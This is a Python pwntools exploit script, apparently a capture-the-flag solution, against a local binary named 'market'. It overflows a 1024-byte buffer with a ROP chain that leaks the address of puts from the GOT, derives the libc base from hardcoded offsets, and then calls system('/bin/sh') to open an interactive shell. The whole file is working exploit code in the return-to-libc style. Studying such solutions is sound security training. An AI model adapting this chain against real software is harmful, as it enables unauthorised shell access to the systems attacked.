#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./market
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./market')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break *update+77
'''.format(**locals())

io = start()

# ROP GADGETS 

_sell = 0x4011d6
_main = 0x4012fb
_call_puts = 0x4011e5
_pop_rdi_ret = 0x4013c3
_ret = 0x40101a
_got_puts = 0x404018
_got_printf = 0x404020

_puts_offset =0x0809c0
_system_offset = 0x04f440 
_bin_sh_offset = 0x1b3e9a

# first ROP chain reads the address of puts from the Global Offset Table and prints it, calling main at the end to exploit again 
print(io.recv())
io.send('u\n')
print(io.recv())
io.sendline(b'A'*1024+ b'BBBBBBBB' + p64(_pop_rdi_ret) + p64(_got_puts) + p64(_call_puts) + p64(_main))
leak = u64(io.recvline().strip().ljust(8, b'\x00'))

# calculate`` libc base address based on known value
base = leak - _puts_offset

print('leaked libc base address', hex(base) )
system = base + _system_offset
print('libc system address', hex(system))

bin_sh = base + _bin_sh_offset  

print(io.recv())
io.send('u\n')
print('Triggering final exploit...')
io.sendline(b'A'*1024+ b'BBBBBBBB' + p64(_pop_rdi_ret) + p64(bin_sh) + p64(base+_system_offset) + p64(base + 0x43120))
io.interactive()
# repeat process for printf
